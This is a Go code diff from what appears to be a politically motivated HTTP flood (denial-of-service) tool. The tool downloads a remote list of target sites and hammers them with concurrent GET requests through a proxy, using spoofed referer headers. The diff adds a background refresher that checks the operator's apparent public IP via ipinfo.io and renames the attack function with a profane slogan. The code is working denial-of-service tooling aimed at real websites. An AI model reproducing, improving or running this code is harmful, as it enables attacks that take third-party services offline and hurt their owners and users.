@@ -59,6 +59,7 @@ var (
 	statData                   statistics
 	limiter, refresher         chan struct{}
 	noProxyClient, proxyClient *http.Client
+	ipEcho                     ipInfo
 
 	headersReferers []string = []string{
 		"http://www.google.com/?q=",
@@ -131,7 +132,7 @@ func main() {
 
 				go func(huilo strikeItem) {
 					defer func() { <-limiter }()
-					if err := greetingsTorussiaWarShip(huilo); err != nil {
+					if err := russiaWarShipFuckYou(huilo); err != nil {
 						atomic.AddInt32(&site.failCnt, 1)
 					} else {
 						atomic.AddInt32(&site.succCnt, 1)
@@ -158,10 +159,6 @@ func fetchStrikeList(siteUrl *string) error {
 		fmt.Printf("failed to create new Request for Strike List: %v\n", err)
 	}
 
-	// req.Header.Set("Cache-Control", "no-cache")
-	// req.Header.Set("Accept-Charset", acceptCharset)
-	// req.Header.Set("Accept", "text/json, application/json")
-
 	resp, err = noProxyClient.Do(req)
 	if err != nil {
 		fmt.Printf("failed to execute strike List update request: %v\n", err)
@@ -176,11 +173,6 @@ func fetchStrikeList(siteUrl *string) error {
 	if err = json.Unmarshal(body, &strikeList); err != nil {
 		return fmt.Errorf("failed to parse json of strike list: %v", err)
 	}
-
-	// time.Sleep(200 * time.Microsecond)
-	// fmt.Println("***\t\t\t\t***")
-	// fmt.Printf("* * fetched sites:\t%d\t* *\n", len(strikeList))
-	// fmt.Println("***\t\t\t\t***")
 
 	var idx = 0
 	for _, strike := range strikeList {
@@ -198,8 +190,6 @@ func fetchStrikeList(siteUrl *string) error {
 		idx++
 	}
 	strikeList = strikeList[:idx]
-	// fmt.Printf("* * filtered sites:\t%d\t* *\n", len(strikeList))
-	// fmt.Println("***\t\t\t\t***")
 
 	return err
 }
@@ -239,10 +229,16 @@ type ipInfo struct {
 }
 
 func (ii *ipInfo) String() string {
+	if len(ii.Ip) == 0 {
+		return "Unknown"
+	}
+
 	return fmt.Sprintf("%s (%s,%s,%s,%s); %s; %s; %s", ii.Ip, ii.City, ii.Region, ii.Postal, ii.Country, ii.Loc, ii.Org, ii.Timezone)
 }
 
 func startStatsPrinter(stat *statistics, strikes []strikeItem, refresh time.Duration) {
+	startIpInfoRefresher()
+
 	ticker := time.NewTicker(refresh)
 
 	go func() {
@@ -252,7 +248,7 @@ func startStatsPrinter(stat *statistics, strikes []strikeItem, refresh time.Dura
 				stats := tm.NewTable(0, 8, 4, ' ', 0)
 				ct := time.Now()
 				fmt.Fprintf(stats, "Current Time: %s\n", ct.Format(time.RFC1123))
-				fmt.Fprintf(stats, "Current IP: %s\n", currentIpInfo())
+				fmt.Fprintf(stats, "Current IP: %s\n", ipEcho.String())
 				fmt.Fprintf(stats, "##\tURL\tSUCC\tFAIL\tDURATION\n")
 				for i, strike := range strikes {
 					site, ok := (*stat)[strike.Url]
@@ -282,33 +278,46 @@ func startStatsPrinter(stat *statistics, strikes []strikeItem, refresh time.Dura
 	}()
 }
 
-func currentIpInfo() string {
-	var ipEcho ipInfo
+func startIpInfoRefresher() {
+	refreshIpInfo()
 
+	ticker := time.NewTicker(15 * time.Second)
+
+	go func() {
+		for {
+			select {
+			case <-ticker.C:
+				refreshIpInfo()
+			}
+		}
+	}()
+}
+
+func refreshIpInfo() {
 	req, err := http.NewRequest(http.MethodGet, "https://ipinfo.io/json", nil)
 	if err != nil {
-		return err.Error()
+		return // err.Error()
 	}
 
 	resp, err := proxyClient.Do(req)
 	if err != nil {
-		return err.Error()
+		return // err.Error()
 	}
 	defer resp.Body.Close()
 
 	body, err := ioutil.ReadAll(resp.Body)
 	if err != nil {
-		return err.Error()
+		return // err.Error()
 	}
 
 	if err := json.Unmarshal(body, &ipEcho); err != nil {
-		return err.Error()
+		return // err.Error()
 	}
 
-	return ipEcho.String()
+	return // ipEcho.String()
 }
 
-func greetingsTorussiaWarShip(huilo strikeItem) error {
+func russiaWarShipFuckYou(huilo strikeItem) error {
 	req, err := http.NewRequest(http.MethodGet, huilo.PagePayload(), nil)
 	if err != nil {
 		fmt.Printf("couldn't create new request: %v\n", err)
